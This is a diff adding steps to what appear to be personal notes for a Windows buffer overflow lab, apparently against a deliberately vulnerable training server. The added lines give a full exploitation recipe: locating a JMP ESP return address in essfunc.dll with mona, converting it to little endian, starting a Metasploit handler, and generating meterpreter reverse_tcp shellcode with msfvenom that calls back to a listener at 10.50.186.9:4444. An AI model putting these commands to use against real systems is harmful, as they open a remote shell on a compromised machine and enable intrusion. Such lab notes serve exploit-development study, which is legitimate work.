@@ -15,6 +15,28 @@ Check status "Paused" or "Running" (bottom right), use rewind and play buttons
 Use wiremask, generate string. Run the script, check the EIP in immunity
 Throw EIP value into wiremask to get offset.
 
+Find JMP ESP, in Immunity
+!mona modules, look for dll with all falses (essfunc.dll)
+
+###Search for jmp esp
+!mona jmp -r esp -m "essfunc.dll"
+window > log data > right click copy address 625011AF
+convert to little endian:
+AF115062 -> "\xaf\x11\x50\x62" # Convert to little endian for py script
+
+# Start Multihandler, on Linops
+msfconsole
+use multi/handler
+show options
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+
+#Shell code
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.186.9 lport 4444 -b "\x00" -f python
+leave out first buf += "" line
+
 script:
 #!/usr/bin/python
 import socket
